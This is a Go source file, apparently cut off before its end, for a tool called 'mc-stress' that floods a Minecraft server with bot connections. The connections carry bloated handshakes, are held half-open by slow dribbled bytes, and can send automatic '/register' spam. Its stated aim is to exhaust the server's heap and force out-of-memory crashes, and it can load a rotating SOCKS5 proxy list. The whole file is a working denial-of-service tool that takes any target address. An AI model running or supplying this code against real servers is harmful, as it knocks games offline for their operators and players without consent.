package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"io"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"
	"github.com/spf13/viper"
	"golang.org/x/net/proxy"
)

var (
	activeConns  atomic.Int64
	bytesSent    atomic.Int64
	droppedConns atomic.Int64
	newConns     atomic.Int64

	// Mojang credentials for online-mode auth. If empty, encryption is attempted
	// but Mojang join is skipped — the server will kick with "Failed to verify username!"
	accessToken string
	playerUUID  string
	login       bool
	prelogin    bool
	har         bool
)

var proxyPool []string

var (
	// joinGate is a shared rate-limiter channel; workers block here before each
	// new TCP dial. nil means unlimited. Set via --join-delay.
	joinGate chan struct{}

	version = "dev"
	commit  = "none"
	date    = "unknown"
)

// ---------------------------------------------------------------------------
// ANSI colours
// ---------------------------------------------------------------------------

const (
	cReset     = "\033[0m"
	cDim       = "\033[2m"
	cBoldGreen = "\033[1;32m"
	cBoldCyan  = "\033[1;36m"
	cBoldRed   = "\033[1;31m"
	cBoldYellow = "\033[1;33m"
	cGreen     = "\033[32m"
	cCyan      = "\033[36m"
	cGray      = "\033[90m"
)

func ts() string { return fmt.Sprintf("%s%s%s", cDim, time.Now().Format("15:04:05.000"), cReset) }

func dbgSend(id int, name string, pkt []byte) {
	fmt.Printf("%s %s→ SEND%s  %s0x%02X%s  %-34s %s%6d B%s\n",
		ts(), cBoldGreen, cReset, cGreen, id, cReset, name, cGray, len(pkt), cReset)
}

func dbgRecv(id int, name string, payload []byte) {
	preview := ""
	if n := 16; len(payload) > 0 {
		if len(payload) < n {
			n = len(payload)
		}
		preview = fmt.Sprintf("  %s[% x]%s", cGray, payload[:n], cReset)
	}
	fmt.Printf("%s %s← RECV%s  %s0x%02X%s  %-34s %s%6d B%s%s\n",
		ts(), cBoldCyan, cReset, cCyan, id, cReset, name, cGray, len(payload), cReset, preview)
}

func dbgInfo(format string, args ...interface{}) {
	fmt.Printf("%s         %s%s%s\n", ts(), cGray, fmt.Sprintf(format, args...), cReset)
}

func dbgState(from, to string) {
	fmt.Printf("%s %s[%s → %s]%s\n", ts(), cBoldYellow, from, to, cReset)
}

func dbgOK(msg string) {
	fmt.Printf("%s %s✓%s  %s\n", ts(), cBoldGreen, cReset, msg)
}

func dbgErr(label string, err error) {
	fmt.Printf("%s %s✗%s  %s: %v\n", ts(), cBoldRed, cReset, label, err)
}

func getDialer() (proxy.Dialer, error) {
	baseDialer := &net.Dialer{Timeout: 10 * time.Second}
	if len(proxyPool) == 0 {
		return baseDialer, nil
	}
	proxyAddr := proxyPool[rand.Intn(len(proxyPool))]
	return proxy.SOCKS5("tcp", proxyAddr, nil, baseDialer)
}

// ---------------------------------------------------------------------------
// Packet name tables (protocol 767 / 1.21.1)
// ---------------------------------------------------------------------------

func loginSPacketName(id int) string {
	switch id {
	case 0x00:
		return "Disconnect (Login)"
	case 0x01:
		return "Encryption Request"
	case 0x02:
		return "Login Success"
	case 0x03:
		return "Set Compression"
	case 0x04:
		return "Login Plugin Request"
	default:
		return "Unknown"
	}
}

func configSPacketName(id int) string {
	switch id {
	case 0x00:
		return "Cookie Request (Config)"
	case 0x01:
		return "Plugin Message (Config)"
	case 0x02:
		return "Disconnect (Config)"
	case 0x03:
		return "Finish Configuration"
	case 0x04:
		return "Keep Alive (Config)"
	case 0x05:
		return "Ping (Config)"
	case 0x06:
		return "Reset Chat"
	case 0x07:
		return "Registry Data"
	case 0x08:
		return "Remove Resource Pack (Config)"
	case 0x09:
		return "Known Packs"
	case 0x0A:
		return "Store Cookie (Config)"
	case 0x0B:
		return "Transfer (Config)"
	case 0x0C:
		return "Feature Flags"
	case 0x0D:
		return "Update Tags (Config)"
	case 0x0E:
		return "Select Known Packs"
	case 0x0F:
		return "Custom Report Details"
	case 0x10:
		return "Server Links"
	default:
		return "Unknown"
	}
}

func playSPacketName(id int) string {
	switch id {
	case 0x1B, 0x1D:
		return "Disconnect (Play)"
	case 0x26:
		return "Keep Alive"
	case 0x28:
		return "Join Game"
	case 0x3C:
		return "Player Position"
	default:
		return "Unknown"
	}
}

// ---------------------------------------------------------------------------
// Debug runner (single connection, full packet log)
// ---------------------------------------------------------------------------

func debugRun(target string, port uint16, bloatSize int, dribbleInterval time.Duration) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	host := randString(rng, bloatSize)
	name := randString(rng, 16)

	fmt.Printf("\n%s  debug mode  target=%s  bloat=%d  dribble=%s\n\n",
		cBoldYellow, target, bloatSize, dribbleInterval)

	start := time.Now()
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		dbgErr("connect", err)
		return
	}
	defer conn.Close()
	dbgOK(fmt.Sprintf("connected to %s", target))

	// ── Handshake ──────────────────────────────────────────────────────────
	hs := buildHandshake(host, port)
	conn.Write(hs)
	dbgSend(0x00, "Handshake", hs)
	dbgInfo("proto=767  host=%s(%d)  port=%d  next=Login", host[:min(12, len(host))], len(host), port)

	ls := buildLoginStart(name)
	conn.Write(ls)
	dbgSend(0x00, fmt.Sprintf("Login Start  name=%s", name), ls)

	dbgState("Handshake", "Login")

	// ── Login state ────────────────────────────────────────────────────────
	compressed := false
	active := net.Conn(conn)

	for {
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		id, payload, err := readPacket(active, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			dbgErr("read (Login)", err)
			return
		}

		dbgRecv(id, loginSPacketName(id), payload)

		switch id {
		case 0x00: // Disconnect
			dbgInfo("reason: %s", fmtJSON(payload))
			dbgErr("server disconnected", fmt.Errorf("during Login state"))
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x03: // Set Compression
			threshold, _ := decodeVarInt(payload)
			if threshold >= 0 {
				compressed = true
				dbgInfo("compression enabled  threshold=%d", threshold)
			} else {
				compressed = false
				dbgInfo("compression disabled (threshold < 0)")
			}

		case 0x01: // Encryption Request
			serverID, pubKeyDER, verifyToken, shouldAuth, err := parseEncryptionRequest(payload)
			if err != nil {
				dbgErr("parse Encryption Request", err)
				return
			}
			dbgInfo("serverID=%q  pubkey=%d B  verifyToken=%x  shouldAuth=%v",
				serverID, len(pubKeyDER), verifyToken, shouldAuth)

			sharedSecret := make([]byte, 16)
			cryptorand.Read(sharedSecret)
			dbgInfo("sharedSecret=%x", sharedSecret)

			pubAny, err := x509.ParsePKIXPublicKey(pubKeyDER)
			if err != nil {
				dbgErr("parse RSA key", err)
				return
			}
			pubKey := pubAny.(*rsa.PublicKey)
			dbgInfo("RSA key: %d bits", pubKey.N.BitLen())

			encSecret, _ := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, sharedSecret)
			encToken, _ := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, verifyToken)

			if accessToken != "" && playerUUID != "" {
				serverHash := minecraftSHA1([]byte(serverID), sharedSecret, pubKeyDER)
				dbgInfo("serverHash=%s", serverHash)
				dbgInfo("calling Mojang session server…")
				if err := mojangJoin(accessToken, playerUUID, serverHash); err != nil {
					dbgErr("Mojang auth", err)
				} else {
					dbgOK("Mojang auth OK")
				}
			} else {
				dbgInfo("no credentials — skipping Mojang join (expect kick)")
			}

			resp := buildEncryptionResponse(encSecret, encToken)
			conn.Write(resp)
			dbgSend(0x01, "Encryption Response", resp)

			active = enableEncryption(conn, sharedSecret)
			dbgOK("AES/CFB8 encryption enabled")

		case 0x02: // Login Success
			dbgInfo("UUID+name in payload (%d B)", len(payload))
			ack := buildPacket(0x03, nil, compressed)
			active.Write(ack)
			dbgSend(0x03, "Login Acknowledged", ack)
			dbgState("Login", "Configuration")
			debugRunConfig(active, compressed, start)
			return
		}
	}
}

func debugRunConfig(conn net.Conn, compressed bool, start time.Time) {
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			dbgErr("read (Config)", err)
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return
		}

		dbgRecv(id, configSPacketName(id), data)

		switch id {
		case 0x01: // Plugin Message (Config)
			strLen, n := decodeVarInt(data)
			if n+strLen <= len(data) {
				dbgInfo("channel=%s", string(data[n:n+strLen]))
			}

		case 0x07: // Registry Data
			strLen, n := decodeVarInt(data)
			if n+strLen <= len(data) {
				dbgInfo("registry=%s", string(data[n:n+strLen]))
			}

		case 0x0D: // Update Tags (Config)
			dbgInfo("tags update (%d bytes)", len(data))

		case 0x02: // Disconnect (was 0x01)
			dbgInfo("reason: %s", fmtJSON(data))
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x03: // Finish Configuration (was 0x02)
			ack := buildPacket(0x03, nil, compressed)
			conn.Write(ack)
			dbgSend(0x03, "Acknowledge Configuration", ack)
			dbgState("Configuration", "Play")
			debugRunPlay(conn, compressed, start)
			return

		case 0x04: // Keep Alive (was 0x03)
			resp := buildPacket(0x04, data, compressed)
			conn.Write(resp)
			dbgSend(0x04, "Keep Alive Response (Config)", resp)

		case 0x05: // Ping (was 0x04)
			resp := buildPacket(0x05, data, compressed)
			conn.Write(resp)
			dbgSend(0x05, "Pong", resp)

		case 0x0E: // Select Known Packs
			// Respond with 0 known packs
			resp := buildPacket(0x07, []byte{0x00}, compressed)
			conn.Write(resp)
			dbgSend(0x07, "Known Packs", resp)
		}
	}
}

func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
	dbgOK("Play state reached — holding indefinitely (Ctrl-C to stop)")
	kaCount := 0

	if login {
		go func() {
			time.Sleep(1000 * time.Millisecond)
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			pass1 := randString(rng, 10)
			pass2 := randString(rng, 10)

			cmd1 := fmt.Sprintf("register %s", pass1)
			pkt1 := buildChatCommand(cmd1, compressed)
			conn.Write(pkt1)
			dbgSend(0x04, fmt.Sprintf("/%s", cmd1), pkt1)

			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
			pkt2 := buildChatCommand(cmd2, compressed)
			conn.Write(pkt2)
			dbgSend(0x04, fmt.Sprintf("/%s", cmd2), pkt2)
		}()
	}

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			// EOF is expected immediately after a Disconnect packet — don't log it.
			if err.Error() != "EOF" {
				dbgErr("read (Play)", err)
			}
			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return
		}

		dbgRecv(id, playSPacketName(id), data)

		switch id {
		case 0x1B, 0x1D: // Disconnect (Play)
			dbgInfo("reason: %s", fmtJSON(data))
			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x26: // Keep Alive
			kaCount++
			kaID, _ := binary.ReadUvarint(bytes.NewReader(data))
			dbgInfo("id=%d", kaID)
			resp := buildPacket(0x18, data, compressed)
			conn.Write(resp)
			dbgSend(0x18, fmt.Sprintf("Keep Alive Response  #%d", kaCount), resp)

		case 0x28: // Join Game
			dbgInfo("play start")

		case 0x3C: // Player Position
			dbgInfo("server position/rotation update")
		}
	}
}

// fmtJSON returns a trimmed string representation of packet payload that is
// likely a JSON chat component (e.g. Disconnect reason).
func fmtJSON(payload []byte) string {
	if len(payload) > 0 && payload[0] == 0x0a {
		// It's NBT. For a stresser, we'll just show hex or a simplified view.
		return fmt.Sprintf("[NBT] %x", payload)
	}
	strLen, n := decodeVarInt(payload)
	if n < len(payload) && strLen > 0 && n+strLen <= len(payload) {
		return string(payload[n : n+strLen])
	}
	return fmt.Sprintf("%x", payload)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ---------------------------------------------------------------------------
// Write-side helpers
// ---------------------------------------------------------------------------

func writeVarInt(buf []byte, v int) []byte {
	for {
		b := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		buf = append(buf, b)
		if v == 0 {
			break
		}
	}
	return buf
}

func writeString(buf []byte, s string) []byte {
	raw := []byte(s)
	buf = writeVarInt(buf, len(raw))
	return append(buf, raw...)
}

func buildPacket(id int, payload []byte, compressed bool) []byte {
	var data []byte
	data = writeVarInt(data, id)
	data = append(data, payload...)

	if compressed {
		// Wrap in compression header
		var inner []byte
		inner = writeVarInt(inner, 0) // Uncompressed length = 0 (not compressed)
		inner = append(inner, data...)

		var out []byte
		out = writeVarInt(out, len(inner))
		return append(out, inner...)
	} else {
		var out []byte
		out = writeVarInt(out, len(data))
		return append(out, data...)
	}
}

func buildChatCommand(cmd string, compressed bool) []byte {
	var payload []byte
	payload = writeString(payload, cmd)

	// Timestamp (Long)
	t := time.Now().UnixMilli()
	tBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(tBuf, uint64(t))
	payload = append(payload, tBuf...)

	// Salt (Long)
	payload = append(payload, make([]byte, 8)...)

	// Argument Count (VarInt) = 0
	payload = writeVarInt(payload, 0)

	// Message Count (VarInt) = 0
	payload = writeVarInt(payload, 0)

	// Acknowledged Messages (BitSet) = empty (0 VarInt count)
	payload = writeVarInt(payload, 0)

	return buildPacket(0x04, payload, compressed)
}

func buildHandshake(host string, port uint16) []byte {
	var payload []byte
	payload = writeVarInt(payload, 0x00)
	payload = writeVarInt(payload, 767)
	payload = writeString(payload, host)
	portBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(portBuf, port)
	payload = append(payload, portBuf...)
	payload = writeVarInt(payload, 2)
	var out []byte
	out = writeVarInt(out, len(payload))
	return append(out, payload...)
}

func buildLoginStart(name string) []byte {
	var payload []byte
	payload = writeString(payload, name)
	payload = append(payload, make([]byte, 16)...)
	return buildPacket(0x00, payload, false)
}

func buildEncryptionResponse(encSecret, encToken []byte) []byte {
	var data []byte
	data = writeVarInt(data, len(encSecret))
	data = append(data, encSecret...)
	data = append(data, 0x01)
	data = writeVarInt(data, len(encToken))
	data = append(data, encToken...)
	return buildPacket(0x01, data, false)
}

// ---------------------------------------------------------------------------
// Read-side helpers
// ---------------------------------------------------------------------------

func readVarInt(r io.Reader) (int, error) {
	var v int
	for shift := uint(0); shift < 21; shift += 7 {
		var b [1]byte
		if _, err := io.ReadFull(r, b[:]); err != nil {
			return 0, err
		}
		v |= int(b[0]&0x7F) << shift
		if b[0]&0x80 == 0 {
			return v, nil
		}
	}
	return 0, fmt.Errorf("VarInt too large")
}

func decodeVarInt(buf []byte) (int, int) {
	var v int
	for i, b := range buf {
		v |= int(b&0x7F) << (7 * uint(i))
		if b&0x80 == 0 {
			return v, i + 1
		}
	}
	return v, len(buf)
}

func readPacket(r io.Reader, compressed bool) (int, []byte, error) {
	length, err := readVarInt(r)
	if err != nil {
		return 0, nil, err
	}
	if length <= 0 || length > 1<<21 {
		return 0, nil, fmt.Errorf("bad packet length %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return 0, nil, err
	}

	data := buf
	if compressed {
		uLen, n := decodeVarInt(buf)
		if n > len(buf) {
			return 0, nil, fmt.Errorf("truncated compression header")
		}
		if uLen > 0 {
			// Data is compressed
			zr, err := zlib.NewReader(bytes.NewReader(buf[n:]))
			if err != nil {
				return 0, nil, fmt.Errorf("zlib reader: %v", err)
			}
			defer zr.Close()
			data, err = io.ReadAll(zr)
			if err != nil {
				return 0, nil, fmt.Errorf("zlib read: %v", err)
			}
			if len(data) != uLen {
				return 0, nil, fmt.Errorf("zlib size mismatch: got %d, want %d", len(data), uLen)
			}
		} else {
			// Data is uncompressed (wrapped)
			data = buf[n:]
		}
	}

	id, n := decodeVarInt(data)
	return id, data[n:], nil
}

func parseEncryptionRequest(payload []byte) (serverID string, pubKeyDER, verifyToken []byte, shouldAuth bool, err error) {
	idLen, n := decodeVarInt(payload)
	if n+idLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated server ID")
	}
	serverID = string(payload[n : n+idLen])
	pos := n + idLen

	pkLen, n := decodeVarInt(payload[pos:])
	pos += n
	if pos+pkLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated public key")
	}
	pubKeyDER = payload[pos : pos+pkLen]
	pos += pkLen

	vtLen, n := decodeVarInt(payload[pos:])
	pos += n
	if pos+vtLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated verify token")
	}
	verifyToken = payload[pos : pos+vtLen]
	pos += vtLen

	if pos < len(payload) {
		shouldAuth = payload[pos] != 0
	}
	return
}

// ---------------------------------------------------------------------------
// AES/CFB8 encryption
// ---------------------------------------------------------------------------

type cfb8Stream struct {
	block cipher.Block
	sr    []byte
	enc   bool
}

func newCFB8(block cipher.Block, iv []byte, enc bool) cipher.Stream {
	sr := make([]byte, block.BlockSize())
	copy(sr, iv)
	return &cfb8Stream{block: block, sr: sr, enc: enc}
}

func (s *cfb8Stream) XORKeyStream(dst, src []byte) {
	tmp := make([]byte, s.block.BlockSize())
	for i := range src {
		s.block.Encrypt(tmp, s.sr)
		dst[i] = src[i] ^ tmp[0]
		copy(s.sr, s.sr[1:])
		if s.enc {
			s.sr[len(s.sr)-1] = dst[i]
		} else {
			s.sr[len(s.sr)-1] = src[i]
		}
	}
}

type cipherConn struct {
	net.Conn
	enc cipher.Stream
	dec cipher.Stream
}

func (c *cipherConn) Read(p []byte) (int, error) {
	n, err := c.Conn.Read(p)
	if n > 0 {
		c.dec.XORKeyStream(p[:n], p[:n])
	}
	return n, err
}

func (c *cipherConn) Write(p []byte) (int, error) {
	enc := make([]byte, len(p))
	c.enc.XORKeyStream(enc, p)
	return c.Conn.Write(enc)
}

func enableEncryption(conn net.Conn, sharedSecret []byte) net.Conn {
	block, _ := aes.NewCipher(sharedSecret)
	return &cipherConn{
		Conn: conn,
		enc:  newCFB8(block, sharedSecret, true),
		dec:  newCFB8(block, sharedSecret, false),
	}
}

// ---------------------------------------------------------------------------
// Mojang session auth
// ---------------------------------------------------------------------------

func minecraftSHA1(parts ...[]byte) string {
	h := sha1.New()
	for _, p := range parts {
		h.Write(p)
	}
	hash := h.Sum(nil)
	n := new(big.Int).SetBytes(hash)
	if hash[0]&0x80 != 0 {
		n.Sub(n, new(big.Int).Lsh(big.NewInt(1), 160))
	}
	return n.Text(16)
}

var httpClient = &http.Client{Timeout: 10 * time.Second}

// startJoinGate initialises the global rate limiter so that at most one new
// TCP connection is opened per interval across all workers.
func startJoinGate(interval time.Duration) {
	joinGate = make(chan struct{}, 1)
	joinGate <- struct{}{} // first connection is immediate
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for range ticker.C {
			select {
			case joinGate <- struct{}{}:
			default: // discard the tick if no worker is waiting
			}
		}
	}()
}

func mojangJoin(token, uuid, serverHash string) error {
	body := strings.NewReader(fmt.Sprintf(
		`{"accessToken":%q,"selectedProfile":%q,"serverId":%q}`,
		token, uuid, serverHash,
	))
	resp, err := httpClient.Post(
		"https://sessionserver.mojang.com/session/minecraft/join",
		"application/json",
		body,
	)
	if err != nil {
		return err
	}
	resp.Body.Close()
	if resp.StatusCode != 204 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return nil
}

// ---------------------------------------------------------------------------
// Login sequence (production path)
// ---------------------------------------------------------------------------

func tryAdvanceToPlay(conn net.Conn, verbose bool) (net.Conn, bool, bool) {
	compressed := false
	active := conn

	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		id, payload, err := readPacket(active, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			return conn, false, false
		}

		switch id {
		case 0x03:
			threshold, _ := decodeVarInt(payload)
			compressed = (threshold >= 0)

		case 0x01:
			serverID, pubKeyDER, verifyToken, _, err := parseEncryptionRequest(payload)
			if err != nil {
				return conn, false, false
			}
			sharedSecret := make([]byte, 16)
			if _, err := cryptorand.Read(sharedSecret); err != nil {
				return conn, false, false
			}
			pubAny, err := x509.ParsePKIXPublicKey(pubKeyDER)
			if err != nil {
				return conn, false, false
			}
			pubKey, ok := pubAny.(*rsa.PublicKey)
			if !ok {
				return conn, false, false
			}
			encSecret, err := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, sharedSecret)
			if err != nil {
				return conn, false, false
			}
			encToken, err := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, verifyToken)
			if err != nil {
				return conn, false, false
			}
			if accessToken != "" && playerUUID != "" {
				serverHash := minecraftSHA1([]byte(serverID), sharedSecret, pubKeyDER)
				if err := mojangJoin(accessToken, playerUUID, serverHash); err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "\nmojang: %v\n", err)
					}
					return conn, false, false
				}
			}
			resp := buildEncryptionResponse(encSecret, encToken)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			if err != nil {
				return conn, false, false
			}
			bytesSent.Add(int64(len(resp)))
			active = enableEncryption(conn, sharedSecret)

		case 0x02:
			ack := buildPacket(0x03, nil, compressed)
			active.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = active.Write(ack)
			active.SetWriteDeadline(time.Time{})
			if err != nil {
				return conn, false, false
			}
			bytesSent.Add(int64(len(ack)))
			ok := drainConfig(active, compressed, verbose)
			return active, ok, compressed

		default:
			return conn, false, false
		}
	}
}

func drainConfig(conn net.Conn, compressed bool, verbose bool) bool {
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			return false
		}
		switch id {
		case 0x02: // Disconnect
			return false
		case 0x03: // Finish Configuration (was 0x02)
			ack := buildPacket(0x03, nil, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = conn.Write(ack)
			conn.SetWriteDeadline(time.Time{})
			if err != nil {
				return false
			}
			bytesSent.Add(int64(len(ack)))
			return true
		case 0x04: // Keep Alive (was 0x03)
			resp := buildPacket(0x04, data, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))
		case 0x05: // Ping (was 0x04)
			resp := buildPacket(0x05, data, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))

		case 0x0E: // Select Known Packs
			resp := buildPacket(0x07, []byte{0x00}, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))
		}
	}
}

func holdConnPlay(conn net.Conn, compressed bool, verbose bool, rng *rand.Rand) {
	defer conn.Close()
	defer activeConns.Add(-1)

	if login {
		go func() {
			time.Sleep(1000 * time.Millisecond)
			pass1 := randString(rng, 10)
			pass2 := randString(rng, 10)

			cmd1 := fmt.Sprintf("register %s", pass1)
			pkt1 := buildChatCommand(cmd1, compressed)
			conn.Write(pkt1)
			bytesSent.Add(int64(len(pkt1)))

			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
			pkt2 := buildChatCommand(cmd2, compressed)
			conn.Write(pkt2)
			bytesSent.Add(int64(len(pkt2)))
		}()
	}

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			droppedConns.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "\nplay error: %v\n", err)
			}
			return
		}
		if id == 0x26 {
			resp := buildPacket(0x18, data, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))
		}
	}
}

func holdConn(conn net.Conn, interval time.Duration, verbose bool) {
	defer conn.Close()
	defer activeConns.Add(-1)

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	headerSent := false
	for range ticker.C {
		var dribble []byte
		if !headerSent {
			dribble = []byte{0xFF, 0xFF, 0x03}
			headerSent = true
		} else {
			dribble = []byte{0x00}
		}
		_, err := conn.Write(dribble)
		if err != nil {
			droppedConns.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "\ndribble error: %v\n", err)
			}
			return
		}
		bytesSent.Add(int64(len(dribble)))
	}
}

// ---------------------------------------------------------------------------
// Worker
// ---------------------------------------------------------------------------

func randString(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func worker(target string, port uint16, bloatSize int, dribbleInterval time.Duration, verbose bool, seed int64, prelogin bool, har bool) {
	rng := rand.New(rand.NewSource(seed))

	for {
		if joinGate != nil {
			<-joinGate
		}

		host := randString(rng, bloatSize)
		handshake := buildHandshake(host, port)

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
			}
			droppedConns.Add(1)
			time.Sleep(500 * time.Millisecond)
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write(handshake)
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			conn.Close()
			if verbose {
				fmt.Fprintf(os.Stderr, "\nhandshake: %v\n", err)
			}
			droppedConns.Add(1)
			continue
		}
		bytesSent.Add(int64(len(handshake)))

		loginPkt := buildLoginStart(randString(rng, 16))
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write(loginPkt)
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			conn.Close()
			droppedConns.Add(1)
			continue
		}
		bytesSent.Add(int64(len(loginPkt)))

		if prelogin {
			if !har {
				// Wait for any packet back to ensure the server processed Login Start
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				if _, _, err := readPacket(conn, false); err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "\nprelogin read: %v\n", err)
					}
					droppedConns.Add(1)
				}
			}
			conn.Close()
			activeConns.Add(1) // Briefly count as active for metrics
			activeConns.Add(-1)
			newConns.Add(1)
			continue
		}

		activeConns.Add(1)
		newConns.Add(1)

		activeConn, inPlay, compressed := tryAdvanceToPlay(conn, verbose)
		if inPlay {
			holdConnPlay(activeConn, compressed, verbose, rng)
		} else {
			holdConn(activeConn, dribbleInterval, verbose)
		}
	}
}

// ---------------------------------------------------------------------------
// Reporting / CLI
// ---------------------------------------------------------------------------

func startReporter() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for range ticker.C {
		active := activeConns.Load()
		dropped := droppedConns.Load()
		sent := bytesSent.Load()
		rate := newConns.Swap(0)

		fmt.Printf("\r\033[K[%s] Active: %6d | New/s: %4d | Dropped: %6d | Sent: %s",
			time.Now().Format("15:04:05"),
			active, rate, dropped, fmtBytes(sent),
		)
	}
}

func fmtBytes(n int64) string {
	switch {
	case n >= 1<<30:
		return fmt.Sprintf("%.2fGB", float64(n)/(1<<30))
	case n >= 1<<20:
		return fmt.Sprintf("%.2fMB", float64(n)/(1<<20))
	case n >= 1<<10:
		return fmt.Sprintf("%.2fKB", float64(n)/(1<<10))
	default:
		return fmt.Sprintf("%dB", n)
	}
}

func loadProxies(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			proxyPool = append(proxyPool, line)
		}
	}
	return nil
}

var rootCmd = &cobra.Command{
	Use:     "mc-stress <ip:port>",
	Version: fmt.Sprintf("%s (commit: %s, date: %s)", version, commit, date),
	Short:   "Minecraft G1GC heap-exhaustion stress tester",
	Long: `Holds thousands of half-open Minecraft connections to force G1GC object
promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]

		_, portStr, err := net.SplitHostPort(target)
		if err != nil {
			return fmt.Errorf("invalid target %q: %w", target, err)
		}
		portNum, err := strconv.ParseUint(portStr, 10, 16)
		if err != nil {
			return fmt.Errorf("invalid port: %w", err)
		}
		port := uint16(portNum)

		workers, _ := cmd.Flags().GetInt("workers")
		bloatSize, _ := cmd.Flags().GetInt("bloat-size")
		dribble, _ := cmd.Flags().GetDuration("dribble-interval")
		verbose, _ := cmd.Flags().GetBool("verbose")
		debug, _ := cmd.Flags().GetBool("debug")
		joinDelay, _ := cmd.Flags().GetDuration("join-delay")
		accessToken, _ = cmd.Flags().GetString("access-token")
		playerUUID, _ = cmd.Flags().GetString("player-uuid")
		login, _ = cmd.Flags().GetBool("login")
		prelogin, _ = cmd.Flags().GetBool("prelogin")
		har, _ = cmd.Flags().GetBool("har")

		proxyPath := viper.GetString("proxies")
		if proxyPath != "" {
			if err := loadProxies(proxyPath); err != nil {
				return fmt.Errorf("failed to load proxies: %w", err)
			}
			fmt.Printf("Loaded %d proxies from %s\n", len(proxyPool), proxyPath)
		}

		if bloatSize > 255 {
			return fmt.Errorf("--bloat-size max is 255 (Minecraft protocol limit)")
		}

		if debug {
			debugRun(target, port, bloatSize, dribble)
			return nil
		}

		if joinDelay > 0 {
			startJoinGate(joinDelay)
		}

